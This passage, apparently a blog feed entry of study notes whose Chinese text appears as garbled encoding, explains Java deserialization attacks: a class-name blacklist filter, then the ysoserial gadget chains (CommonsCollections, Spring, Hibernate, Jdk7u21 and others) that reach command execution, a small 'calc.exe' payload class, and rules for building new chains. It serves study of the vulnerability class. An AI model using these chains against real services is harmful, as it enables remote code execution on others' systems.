class="params">()</span> <span class="keyword">throws</span> IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">    ObjectInputStream ois = <span class="keyword">new</span> ObjectInputStreamEx(in,</span><br><span class="line">            getClass().getClassLoader(), ClassFilter.DEFAULT);</span><br><span class="line">    <span class="keyword">return</span> (T)ois.readObject();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p><code>ClassFilter.DEFAULT</code> é•¿è¿™æ ·ï¼š</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">java</div></div><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> ClassFilter DEFAULT = <span class="keyword">new</span> ClassFilter() &#123;</span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">boolean</span> <span class="title">isBlacklisted</span><span class="params">(String name)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (name.startsWith(<span class="string">"org.codehaus.groovy.runtime."</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (name.startsWith(<span class="string">"org.apache.commons.collections.functors."</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> name.contains(<span class="string">"org.apache.xalan"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div><p>è¿˜æ˜¯ä¸€ä¸ªç®€ç®€å•å•çš„é»‘åå•ã€‚</p><h2 id="POPçš„è‰ºæœ¯"><a href="#POPçš„è‰ºæœ¯" class="headerlink" title="POPçš„è‰ºæœ¯"></a>POPçš„è‰ºæœ¯</h2><p>æ—¢ç„¶ååºåˆ—åŒ–æ¼æ´å¸¸è§çš„ä¿®å¤æ–¹æ¡ˆæ˜¯é»‘åå•ï¼Œå°±å­˜åœ¨è¢«ç»•è¿‡çš„é£é™©ï¼Œä¸€æ—¦å‡ºç°æ–°çš„POPé“¾ï¼ŒåŸæ¥çš„é˜²å¾¡ä¹Ÿå°±ç›´æ¥å®£å‘Šæ— æ•ˆäº†ã€‚</p><p>æ‰€ä»¥åœ¨ååºåˆ—åŒ–æ¼æ´çš„å¯¹æŠ—å²ä¸­ï¼Œé™¤äº†æœ‰å¤§ä½¬ä¸æ–­çš„æŒ–æ˜æ–°çš„ååºåˆ—åŒ–æ¼æ´ç‚¹ï¼Œæ›´æœ‰å¤§ç‰›ä¸æ–­çš„æ¢å¯»æ–°çš„POPé“¾ã€‚</p><p>POPå·²ç»æˆä¸ºååºåˆ—åŒ–åŒºåˆ«äºå…¶ä»–å¸¸è§„Webå®‰å…¨æ¼æ´çš„ä¸€é—¨ç‰¹æ®Šè‰ºæœ¯ã€‚</p><p>æ—¢ç„¶å¦‚æ­¤ï¼Œæˆ‘ä»¬å°±ç”¨ysoserialè¿™ä¸ªé¡¹ç›®ï¼Œæ¥å¥½å¥½æ¢ç©¶ä¸€ä¸‹ç°åœ¨å¸¸ç”¨çš„è¿™äº›RCEç±»POPä¸­åˆ°åº•æœ‰ä»€ä¹ˆä¹¾å¤ï¼š</p><h3 id="BeanShell1"><a href="#BeanShell1" class="headerlink" title="BeanShell1"></a>BeanShell1</h3><p><font color="#0099ff">å‘½ä»¤æ‰§è¡Œè½½ä½“ï¼š</font><code>bsh.Interpreter</code></p><p><font color="#0099ff">ååºåˆ—åŒ–è½½ä½“ï¼š</font><code>PriorityQueue</code></p><p><code>PriorityQueue.readObject()</code> ååºåˆ—åŒ–æ‰€æœ‰å…ƒç´ åï¼Œé€šè¿‡<code>comparator.compare()</code>è¿›è¡Œæ’åºï¼Œè¯¥<code>comparator</code>è¢«ä»£ç†ç»™<code>XThis.Handler</code>å¤„ç†ï¼Œå…¶<code>invoke()</code>ä¼šè°ƒç”¨<code>This.invokeMethod()</code>ä»<code>Interpreter</code>è§£é‡Šå™¨ä¸­è§£æåŒ…å«æ¶æ„ä»£ç çš„<code>compare</code>æ–¹æ³•å¹¶æ‰§è¡Œ</p><h3 id="C3P0"><a href="#C3P0" class="headerlink" title="C3P0"></a>C3P0</h3><p><font color="#0099ff">å‘½ä»¤æ‰§è¡Œè½½ä½“ï¼š</font><code>bsh.Interpreter</code></p><p><font color="#0099ff">ååºåˆ—åŒ–è½½ä½“ï¼š</font><code>com.mchange.v2.c3p0.PoolBackedDataSource</code></p><p><code>PoolBackedDataSource.readObject()</code>è¿›è¡Œåˆ°çˆ¶ç±»<code>PoolBackedDataSourceBase.readObject()</code>é˜¶æ®µï¼Œä¼šè°ƒç”¨<code>ReferenceIndirector$ReferenceSerialized.getObject()</code>è·å–å¯¹è±¡ï¼Œå…¶ä¸­<code>InitialContext.lookup()</code>ä¼šå»åŠ è½½è¿œç¨‹æ¶æ„å¯¹è±¡å¹¶åˆå§‹åŒ–ï¼Œå¯¼è‡´å‘½ä»¤æ‰§è¡Œï¼Œæœ‰äº›åŒå­¦å¯èƒ½ä¸å¤ªæ¸…æ¥šè¿œç¨‹æ¶æ„å¯¹è±¡çš„é•¿ç›¸ï¼Œä¸¾ä¸ªç®€å•çš„ä¾‹å­ï¼š</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">java</div></div><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Malicious</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Malicious</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        java.lang.Runtime.getRuntime().exec(<span class="string">"calc.exe"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><h3 id="Clojure"><a href="#Clojure" class="headerlink" title="Clojure"></a>Clojure</h3><p><font color="#0099ff">å‘½ä»¤æ‰§è¡Œè½½ä½“ï¼š</font><code>clojure.core$comp$fn__4727</code></p><p><font color="#0099ff">ååºåˆ—åŒ–è½½ä½“ï¼š</font><code>HashMap</code></p><p><code>HashMap.readObject()</code>ååºåˆ—åŒ–å„å…ƒç´ æ—¶ï¼Œé€šè¿‡å®ƒçš„<code>hashCode()</code>å¾—åˆ°hashå€¼ï¼Œè€Œ<code>AbstractTableModel$ff19274a.hashCode()</code>ä¼šä»<code>IPersistentMap</code>ä¸­å–<code>hashCode</code>é”®çš„å€¼å¯¹è±¡è°ƒç”¨å…¶<code>invoke()</code>ï¼Œæœ€ç»ˆå¯¼è‡´Clojure Shellå‘½ä»¤å­—ç¬¦ä¸²æ‰§è¡Œ</p><hr><h3 id="CommonsBeanutils1"><a href="#CommonsBeanutils1" class="headerlink" title="CommonsBeanutils1"></a>CommonsBeanutils1</h3><p><font color="#0099ff">å‘½ä»¤æ‰§è¡Œè½½ä½“ï¼š</font><code>org.apache.xalan.xsltc.trax.TemplatesImpl</code></p><p><font color="#0099ff">ååºåˆ—åŒ–è½½ä½“ï¼š</font><code>PriorityQueue</code></p><p><code>PriorityQueue.readObject()</code>æ‰§è¡Œæ’åºæ—¶ï¼Œ<code>BeanComparator.compare()</code>ä¼šæ ¹æ®<code>BeanComparator.property</code> <em>ï¼ˆå€¼ä¸º<code>outputProperties</code>ï¼‰</em> è°ƒç”¨<code>TemplatesImpl.getOutputProperties()</code>ï¼Œå®ƒåœ¨<code>newTransformer()</code>æ—¶ä¼šåˆ›å»º<code>AbstractTranslet</code>å®ä¾‹ï¼Œå¯¼è‡´ç²¾å¿ƒæ„é€ çš„Javaå­—èŠ‚ç è¢«æ‰§è¡Œ</p><h3 id="CommonsCollections1"><a href="#CommonsCollections1" class="headerlink" title="CommonsCollections1"></a>CommonsCollections1</h3><p><font color="#0099ff">å‘½ä»¤æ‰§è¡Œè½½ä½“ï¼š</font><code>org.apache.commons.collections.functors.ChainedTransformer</code></p><p><font color="#0099ff">ååºåˆ—åŒ–è½½ä½“ï¼š</font><code>AnnotationInvocationHandler</code><br>è§å‰æ–‡</p><h3 id="CommonsCollections2"><a href="#CommonsCollections2" class="headerlink" title="CommonsCollections2"></a>CommonsCollections2</h3><p><font color="#0099ff">å‘½ä»¤æ‰§è¡Œè½½ä½“ï¼š</font><code>org.apache.xalan.xsltc.trax.TemplatesImpl</code></p><p><font color="#0099ff">ååºåˆ—åŒ–è½½ä½“ï¼š</font><code>PriorityQueue</code></p><p><code>PriorityQueue.readObject()</code>æ‰§è¡Œæ’åºæ—¶ï¼Œ<code>TransformingComparator.compare()</code>ä¼šè°ƒç”¨<code>InvokerTransformer.transform()</code>è½¬æ¢å…ƒç´ ï¼Œè¿›è€Œè·å–ç¬¬ä¸€ä¸ªå…ƒç´ <code>TemplatesImpl</code>çš„<code>newTransformer()</code>å¹¶è°ƒç”¨ï¼Œæœ€ç»ˆå¯¼è‡´å‘½ä»¤æ‰§è¡Œ</p><h3 id="CommonsCollections3"><a href="#CommonsCollections3" class="headerlink" title="CommonsCollections3"></a>CommonsCollections3</h3><p><font color="#0099ff">å‘½ä»¤æ‰§è¡Œè½½ä½“ï¼š</font><code>org.apache.commons.collections.functors.ChainedTransformer</code></p><p><font color="#0099ff">ååºåˆ—åŒ–è½½ä½“ï¼š</font><code>AnnotationInvocationHandler</code></p><p>é™¤<code>Transformer</code>æ•°ç»„å…ƒç´ ç»„æˆä¸åŒå¤–ï¼Œä¸CommonsCollections1åŸºæœ¬ä¸€è‡´</p><h3 id="CommonsCollections4"><a href="#CommonsCollections4" class="headerlink" title="CommonsCollections4"></a>CommonsCollections4</h3><p><font color="#0099ff">å‘½ä»¤æ‰§è¡Œè½½ä½“ï¼š</font><code>org.apache.commons.collections.functors.ChainedTransformer</code></p><p><font color="#0099ff">ååºåˆ—åŒ–è½½ä½“ï¼š</font><code>PriorityQueue</code></p><p><code>PriorityQueue.readObject()</code>æ‰§è¡Œæ’åºæ—¶ï¼Œ<code>TransformingComparator.compare()</code>ä¼šè°ƒç”¨<code>ChainedTransformer.transform()</code>è½¬æ¢å…ƒç´ ï¼Œè¿›è€Œéå†æ‰§è¡Œ<code>Transformer</code>æ•°ç»„ä¸­çš„æ¯ä¸ªå…ƒç´ ï¼Œæœ€ç»ˆå¯¼è‡´å‘½ä»¤æ‰§è¡Œ</p><h3 id="CommonsCollections5"><a href="#CommonsCollections5" class="headerlink" title="CommonsCollections5"></a>CommonsCollections5</h3><p><font color="#0099ff">å‘½ä»¤æ‰§è¡Œè½½ä½“ï¼š</font><code>org.apache.commons.collections.functors.ChainedTransformer</code></p><p><font color="#0099ff">ååºåˆ—åŒ–è½½ä½“ï¼š</font><code>BadAttributeValueExpException</code></p><p><code>BadAttributeValueExpException.readObject()</code>å½“<code>System.getSecurityManager()</code>ä¸º<code>null</code>æ—¶ï¼Œä¼šè°ƒç”¨<code>TiedMapEntry.toString()</code>ï¼Œå®ƒåœ¨<code>getValue()</code>æ—¶ä¼šé€šè¿‡<code>LazyMap.get()</code>å–å€¼ï¼Œæœ€ç»ˆå¯¼è‡´å‘½ä»¤æ‰§è¡Œ</p><h3 id="CommonsCollections6"><a href="#CommonsCollections6" class="headerlink" title="CommonsCollections6"></a>CommonsCollections6</h3><p><font color="#0099ff">å‘½ä»¤æ‰§è¡Œè½½ä½“ï¼š</font><code>org.apache.commons.collections.functors.ChainedTransformer</code><br><font color="#0099ff">ååºåˆ—åŒ–è½½ä½“ï¼š</font><code>HashSet</code><br><code>HashSet.readObject()</code>ååºåˆ—åŒ–å„å…ƒç´ åï¼Œä¼šè°ƒç”¨<code>HashMap.put()</code>å°†ç»“æœæ”¾è¿›å»ï¼Œè€Œå®ƒé€šè¿‡<code>TiedMapEntry.hashCode()</code>è®¡ç®—hashæ—¶ï¼Œä¼šè°ƒç”¨<code>getValue()</code>è§¦å‘<code>LazyMap.get()</code>å¯¼è‡´å‘½ä»¤æ‰§è¡Œ</p><hr><h3 id="Groovy1"><a href="#Groovy1" class="headerlink" title="Groovy1"></a>Groovy1</h3><p><font color="#0099ff">å‘½ä»¤æ‰§è¡Œè½½ä½“ï¼š</font><code>org.codehaus.groovy.runtime.MethodClosure</code></p><p><font color="#0099ff">ååºåˆ—åŒ–è½½ä½“ï¼š</font><code>AnnotationInvocationHandler</code></p><p><code>AnnotationInvocationHandler.readObject()</code>åœ¨é€šè¿‡<code>memberValues.entrySet()</code>è·å–<code>Entry</code>é›†åˆï¼Œè¯¥<code>memberValues</code>è¢«ä»£ç†ç»™<code>ConvertedClosure</code>æ‹¦æˆª<code>entrySet</code>æ–¹æ³•ï¼Œæ ¹æ®<code>MethodClosure</code>çš„æ„é€ æœ€ç»ˆä¼šç”±<code>ProcessGroovyMethods.execute()</code>æ‰§è¡Œç³»ç»Ÿå‘½ä»¤</p><h3 id="Hibernate1"><a href="#Hibernate1" class="headerlink" title="Hibernate1"></a>Hibernate1</h3><p><font color="#0099ff">å‘½ä»¤æ‰§è¡Œè½½ä½“ï¼š</font><code>org.apache.xalan.xsltc.trax.TemplatesImpl</code></p><p><font color="#0099ff">ååºåˆ—åŒ–è½½ä½“ï¼š</font><code>HashMap</code></p><p><code>HashMap.readObject()</code>é€šè¿‡<code>TypedValue.hashCode()</code>è®¡ç®—hashæ—¶ï¼Œ<code>ComponentType.getPropertyValue()</code>ä¼šè°ƒç”¨<code>PojoComponentTuplizer.getPropertyValue()</code>è·å–åˆ°<code>TemplatesImpl.getOutputProperties</code>æ–¹æ³•å¹¶è°ƒç”¨å¯¼è‡´å‘½ä»¤æ‰§è¡Œ</p><h3 id="Hibernate2"><a href="#Hibernate2" class="headerlink" title="Hibernate2"></a>Hibernate2</h3><p><font color="#0099ff">å‘½ä»¤æ‰§è¡Œè½½ä½“ï¼š</font><code>com.sun.rowset.JdbcRowSetImpl</code><br><font color="#0099ff">ååºåˆ—åŒ–è½½ä½“ï¼š</font><code>HashMap</code><br>æ‰§è¡Œè¿‡ç¨‹ä¸Hibernate1ä¸€è‡´ï¼Œä½†Hibernate2å¹¶ä¸æ˜¯ä¼ å…¥<code>TemplatesImpl</code>æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ï¼Œè€Œæ˜¯åˆ©ç”¨<code>JdbcRowSetImpl.getDatabaseMetaData()</code>è°ƒç”¨<code>connect()</code>è¿æ¥åˆ°è¿œç¨‹RMI</p><hr><h3 id="JBossInterceptors1"><a href="#JBossInterceptors1" class="headerlink" title="JBossInterceptors1"></a>JBossInterceptors1</h3><p><font color="#0099ff">å‘½ä»¤æ‰§è¡Œè½½ä½“ï¼š</font><code>org.apache.xalan.xsltc.trax.TemplatesImpl</code></p><p><font color="#0099ff">ååºåˆ—åŒ–è½½ä½“ï¼š</font><code>org.jboss.interceptor.proxy.InterceptorMethodHandler</code></p><p><code>InterceptorMethodHandler.readObject()</code>åœ¨<code>executeInterception()</code>æ—¶ï¼Œä¼šæ ¹æ®<code>SimpleInterceptorMetadata</code>æ‹¿åˆ°<code>TemplatesImpl</code>æ”¾è¿›<code>ArrayList</code>ä¸­ï¼Œå¹¶ä¼ å…¥<code>SimpleInterceptionChain</code>è¿›è¡Œåˆå§‹åŒ–ï¼Œå®ƒåœ¨è°ƒç”¨<code>invokeNextInterceptor()</code>æ—¶ä¼šå¯¼è‡´å‘½ä»¤æ‰§è¡Œ</p><h3 id="JSON1"><a href="#JSON1" class="headerlink" title="JSON1"></a>JSON1</h3><p><font color="#0099ff">å‘½ä»¤æ‰§è¡Œè½½ä½“ï¼š</font><code>org.apache.xalan.xsltc.trax.TemplatesImpl</code></p><p><font color="#0099ff">ååºåˆ—åŒ–è½½ä½“ï¼š</font><code>HashMap</code></p><p><code>HashMap.readObject()</code>å°†å„å…ƒç´ æ”¾è¿›<code>HashMap</code>æ—¶ï¼Œä¼šè°ƒç”¨<code>TabularDataSupport.equals()</code>è¿›è¡Œæ¯”è¾ƒï¼Œå®ƒçš„<code>JSONObject.containsValue()</code>è·å–å¯¹è±¡ååœ¨<code>PropertyUtils.getProperty()</code>å†…åŠ¨æ€è°ƒç”¨<code>getOutputProperties</code>æ–¹æ³•ï¼Œå®ƒè¢«ä»£ç†ç»™<code>CompositeInvocationHandlerImpl</code>ï¼Œå…¶ä¸­è½¬äº¤ç»™<code>JdkDynamicAopProxy.invoke()</code>ï¼Œåœ¨<code>AopUtils.invokeJoinpointUsingReflection()</code>æ—¶ä¼šä¼ å…¥ä»<code>AdvisedSupport.target</code>å­—æ®µä¸­å–å‡ºæ¥çš„<code>TemplatesImpl</code>ï¼Œæœ€ç»ˆå¯¼è‡´å‘½ä»¤æ‰§è¡Œ</p><h3 id="JavassistWeld1"><a href="#JavassistWeld1" class="headerlink" title="JavassistWeld1"></a>JavassistWeld1</h3><p><font color="#0099ff">å‘½ä»¤æ‰§è¡Œè½½ä½“ï¼š</font><code>org.apache.xalan.xsltc.trax.TemplatesImpl</code></p><p><font color="#0099ff">ååºåˆ—åŒ–è½½ä½“ï¼š</font><code>org.jboss.weld.interceptor.proxy.InterceptorMethodHandler</code></p><p>é™¤JBosséƒ¨åˆ†åŒ…åå­˜åœ¨å·®å¼‚å¤–ï¼Œä¸JBossInterceptors1åŸºæœ¬ä¸€è‡´</p><h3 id="Jdk7u21"><a href="#Jdk7u21" class="headerlink" title="Jdk7u21"></a>Jdk7u21</h3><p><font color="#0099ff">å‘½ä»¤æ‰§è¡Œè½½ä½“ï¼š</font><code>org.apache.xalan.xsltc.trax.TemplatesImpl</code></p><p><font color="#0099ff">ååºåˆ—åŒ–è½½ä½“ï¼š</font><code>LinkedHashSet</code></p><p><code>LinkedHashSet.readObject()</code>å°†å„å…ƒç´ æ”¾è¿›<code>HashMap</code>æ—¶ï¼Œç¬¬äºŒä¸ªå…ƒç´ ä¼šè°ƒç”¨<code>equals()</code>ä¸ç¬¬ä¸€ä¸ªå…ƒç´ è¿›è¡Œæ¯”è¾ƒï¼Œå®ƒè¢«ä»£ç†ç»™<code>AnnotationInvocationHandler</code>è¿›å…¥<code>equalsImpl()</code>ï¼Œåœ¨<code>getMemberMethods()</code>éå†<code>TemplatesImpl</code>çš„æ–¹æ³•é‡åˆ°<code>getOutputProperties</code>è¿›è¡Œè°ƒç”¨æ—¶ï¼Œå¯¼è‡´å‘½ä»¤æ‰§è¡Œ</p><hr><h3 id="MozillaRhino1"><a href="#MozillaRhino1" class="headerlink" title="MozillaRhino1"></a>MozillaRhino1</h3><p> <font color="#0099ff">å‘½ä»¤æ‰§è¡Œè½½ä½“ï¼š</font><code>org.apache.xalan.xsltc.trax.TemplatesImpl</code></p><p> <font color="#0099ff">ååºåˆ—åŒ–è½½ä½“ï¼š</font><code>BadAttributeValueExpException</code></p><p> <code>BadAttributeValueExpException.readObject()</code>è°ƒç”¨<code>NativeError.toString()</code>æ—¶ï¼Œä¼šåœ¨<code>ScriptableObject.getProperty()</code>ä¸­è¿›å…¥<code>getImpl()</code>ï¼Œ<code>ScriptableObject$Slot</code>æ ¹æ®<code>name</code>è·å–åˆ°å°è£…äº†<code>Context.enter</code>æ–¹æ³•çš„<code>MemberBox</code>ï¼Œå¹¶é€šè¿‡å®ƒçš„<code>invoke()</code>å®Œæˆè°ƒç”¨ï¼Œè€Œä¹‹åæ ¹æ®<code>message</code>è°ƒç”¨<code>TemplatesImpl.newTransformer()</code>åˆ™ä¼šå¯¼è‡´å‘½ä»¤æ‰§è¡Œ</p><h3 id="Myfaces1"><a href="#Myfaces1" class="headerlink" title="Myfaces1"></a>Myfaces1</h3><p><font color="#0099ff">å‘½ä»¤æ‰§è¡Œè½½ä½“ï¼š</font><code>org.apache.myfaces.view.facelets.el.ValueExpressionMethodExpression</code></p><p><font color="#0099ff">ååºåˆ—åŒ–è½½ä½“ï¼š</font><code>HashMap</code></p><p><code>HashMap.readObject()</code>é€šè¿‡<code>ValueExpressionMethodExpression.hashCode()</code>è®¡ç®—hashæ—¶ï¼Œä¼šç”±<code>getMethodExpression()</code>è°ƒç”¨<code>ValueExpression.getValue()</code>ï¼Œæœ€ç»ˆå¯¼è‡´ELè¡¨è¾¾å¼æ‰§è¡Œ</p><h3 id="Myfaces2"><a href="#Myfaces2" class="headerlink" title="Myfaces2"></a>Myfaces2</h3><p><font color="#0099ff">å‘½ä»¤æ‰§è¡Œè½½ä½“ï¼š</font><code>org.apache.myfaces.view.facelets.el.ValueExpressionMethodExpression</code><br><font color="#0099ff">ååºåˆ—åŒ–è½½ä½“ï¼š</font><code>HashMap</code></p><p>æ‰§è¡Œè¿‡ç¨‹ä¸Myfaces1ä¸€è‡´ï¼Œä½†Myfaces2çš„ELè¡¨è¾¾å¼å¹¶ä¸æ˜¯ç”±ä½¿ç”¨è€…ä¼ å…¥çš„ï¼Œè€Œæ˜¯é¢„åˆ¶äº†ä¸€ä¸²åŠ è½½è¿œç¨‹æ¶æ„å¯¹è±¡çš„è¡¨è¾¾å¼</p><h3 id="ROME"><a href="#ROME" class="headerlink" title="ROME"></a>ROME</h3><p><font color="#0099ff">å‘½ä»¤æ‰§è¡Œè½½ä½“ï¼š</font><code>org.apache.xalan.xsltc.trax.TemplatesImpl</code></p><p><font color="#0099ff">ååºåˆ—åŒ–è½½ä½“ï¼š</font><code>HashMap</code></p><p><code>HashMap.readObject()</code>é€šè¿‡<code>ObjectBean.hashCode()</code>è®¡ç®—hashæ—¶ï¼Œä¼šåœ¨<code>ToStringBean.toString()</code>é˜¶æ®µéå†<code>TemplatesImpl</code>æ‰€æœ‰å­—æ®µçš„Setterå’ŒGetterå¹¶è°ƒç”¨ï¼Œå½“è°ƒç”¨åˆ°<code>getOutputProperties()</code>æ—¶å°†å¯¼è‡´å‘½ä»¤æ‰§è¡Œ</p><hr><h3 id="Spring1"><a href="#Spring1" class="headerlink" title="Spring1"></a>Spring1</h3><p><font color="#0099ff">å‘½ä»¤æ‰§è¡Œè½½ä½“ï¼š</font><code>org.apache.xalan.xsltc.trax.TemplatesImpl</code></p><p><font color="#0099ff">ååºåˆ—åŒ–è½½ä½“ï¼š</font><code>org.springframework.core.SerializableTypeWrapper$MethodInvokeTypeProvider</code></p><p><code>SerializableTypeWrapper$MethodInvokeTypeProvider.readObject()</code>åœ¨è°ƒç”¨<code>TypeProvider.getType()</code>æ—¶è¢«ä»£ç†ç»™<code>AnnotationInvocationHandler</code>å¾—åˆ°å¦ä¸€ä¸ªHandlerä¸º<code>AutowireUtils$ObjectFactoryDelegatingInvocationHandler</code>çš„ä»£ç†ï¼Œä¹‹åä¼ ç»™<code>ReflectionUtils.invokeMethod()</code>åŠ¨æ€è°ƒç”¨<code>newTransformer</code>æ–¹æ³•æ—¶è¢«ç¬¬äºŒä¸ªä»£ç†æ‹¦æˆªï¼Œå®ƒçš„<code>objectFactory</code>å­—æ®µæ˜¯ç¬¬ä¸‰ä¸ªä»£ç†ï¼Œå› æ­¤<code>objectFactory.getObject()</code>ä¼šè·å¾—<code>TemplatesImpl</code>ï¼Œæœ€ç»ˆå¯¼è‡´å‘½ä»¤æ‰§è¡Œ</p><h3 id="Spring2"><a href="#Spring2" class="headerlink" title="Spring2"></a>Spring2</h3><p> <font color="#0099ff">å‘½ä»¤æ‰§è¡Œè½½ä½“ï¼š</font><code>org.apache.xalan.xsltc.trax.TemplatesImpl</code></p><p><font color="#0099ff">ååºåˆ—åŒ–è½½ä½“ï¼š</font><code>org.springframework.core.SerializableTypeWrapper$MethodInvokeTypeProvider</code></p><p> <code>SerializableTypeWrapper$MethodInvokeTypeProvider.readObject()</code>åœ¨åŠ¨æ€è°ƒç”¨<code>newTransformer</code>æ–¹æ³•æ—¶ï¼Œè¢«ç¬¬äºŒä¸ªä»£ç†æ‹¦æˆªäº¤ç»™<code>JdkDynamicAopProxy</code>ï¼Œå®ƒåœ¨<code>AopUtils.invokeJoinpointUsingReflection()</code>æ—¶ä¼šä¼ å…¥ä»<code>AdvisedSupport.targetSource</code>å­—æ®µä¸­å–å‡ºæ¥çš„<code>TemplatesImpl</code>ï¼Œæœ€ç»ˆå¯¼è‡´å‘½ä»¤æ‰§è¡Œ</p><p>æ ¹æ®ä¸Šé¢è¿™äº›å†…å®¹ï¼Œæˆ‘ä»¬å¯ä»¥å¾—åˆ°å‡ æ¡ç®€å•çš„POPæ„é€ æ³•åˆ™ï¼š</p><ol><li>å½“ä¾èµ–ä¸­ä¸å­˜åœ¨å¯ä»¥æ‰§è¡Œå‘½ä»¤çš„æ–¹æ³•æ—¶ï¼Œå¯ä»¥é€‰æ‹©ä½¿ç”¨<code>TemplatesImpl</code>ä½œä¸ºå‘½ä»¤æ‰§è¡Œè½½ä½“ï¼Œå¹¶æƒ³åŠæ³•å»è§¦å‘å®ƒçš„<code>newTransformer</code>æˆ–<code>getOutputProperties</code>æ–¹æ³•</li><li>å¯ä»¥ä½œä¸ºå…¥å£çš„é€šç”¨ååºåˆ—åŒ–è½½ä½“æ˜¯<code>HashMap</code>ã€<code>AnnotationInvocationHandler</code>ã€<code>BadAttributeValueExpException</code>å’Œ<code>PriorityQueue</code>ï¼Œå®ƒä»¬éƒ½æ˜¯ä¾èµ–è¾ƒå°‘çš„JDKåº•å±‚å¯¹è±¡ï¼ŒåŒºåˆ«å¦‚ä¸‹ï¼š<ul><li><code>HashMap</code>ï¼Œå¯ä»¥ä¸»åŠ¨è§¦å‘å…ƒç´ çš„<code>hashCode</code>å’Œ<code>equals</code>æ–¹æ³•</li><li><code>AnnotationInvocationHandler</code>ï¼Œå¯ä»¥ä¸»åŠ¨è§¦å‘<code>memberValues</code>å­—æ®µçš„<code>setValue</code>æ–¹æ³•ï¼Œæœ¬èº«ä¹Ÿå¯ä»¥ä½œä¸ºåŠ¨æ€ä»£ç†çš„Handleræ‹¦æˆªå¦‚<code>Map.entrySet</code>ç­‰æ–¹æ³•è¿›å…¥è‡ªå·±çš„<code>invoke</code>æ–¹æ³•</li><li><code>BadAttributeValueExpException</code>ï¼Œå¯ä»¥ä¸»åŠ¨è§¦å‘<code>val</code>å­—æ®µçš„<code>toString</code>æ–¹æ³•</li><li><code>PriorityQueue</code>ï¼Œå¯ä»¥ä¸»åŠ¨è§¦å‘<code>comparator</code>å­—æ®µçš„<code>compare</code>æ–¹æ³•</li></ul></li></ol><hr><h2 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h2><p>å†å¹´æ¥ï¼Œå¾ˆå¤šæµè¡Œçš„Javaç»„ä»¶æ¡†æ¶éƒ½è¢«çˆ†å‡ºè¿‡ååºåˆ—åŒ–æ¼æ´ï¼Œè¿™å·²ç»æœ‰å¥½å¤šå¤§ç‰›ä»¬éƒ½è¿›è¡Œè¿‡åˆ†ææ€»ç»“äº†ï¼Œæœ¬æ–‡çš„ä¸»è¦ç›®çš„ä¹Ÿä¸åœ¨æ­¤ï¼Œè€Œæ˜¯ä¸ºäº†å»æ·±æŒ–ååºåˆ—åŒ–æ¼æ´åº•å±‚ä¸€äº›å¯èƒ½è¿˜æ²¡æœ‰è¢«å”¤é†’çš„åœ°æ–¹ã€‚</p><p>ä¸è¿‡æœ‰ä¸€ç‚¹è¦åˆ‡è®°ï¼Œååºåˆ—åŒ–ä¸æ­¢RCEã€‚</p><h1 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h1><ol><li><a href="https://docs.oracle.com/javase/8/docs/" target="_blank" rel="noopener">JavaSE Document</a></li><li><a href="http://hg.openjdk.java.net/" target="_blank" rel="noopener">Java OpenJDK Source Code</a></li><li><a href="https://github.com/unofficial-openjdk/openjdk/" target="_blank" rel="noopener">Java OpenJDK GitHub Mirror</a></li></ol>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;github ä¸Šçœ‹åˆ°çš„ï¼Œè¾¹çœ‹è¾¹å­¦ï¼Œè¾¹è®°ç¬”è®°&lt;br&gt;&lt;a href=&quot;https://github.com/gyyyy&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;æ„Ÿè°¢å®«éŸ³å¸ˆå‚…çš„æ–‡ç« &lt;/a&gt;&lt;/p&gt;
    
    </summary>
    
    
      <category term="å­¦ä¹ ç¬”è®°" scheme="https://manayakko.github.io/yakko117/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    
      <category term="code audit" scheme="https://manayakko.github.io/yakko117/tags/code-audit/"/>
    
  </entry>
  
  <entry>
    <title>Python çˆ¬è™«å­¦ä¹ è®°å½•</title>
    <link href="https://manayakko.github.io/yakko117/2020/02/28/pySpider/"/>
    <id>https://manayakko.github.io/yakko117/2020/02/28/pySpider/</id>
    <published>2020-02-28T01:42:05.382Z</published>
    <updated>2020-02-28T13:29:49.731Z</updated>
    
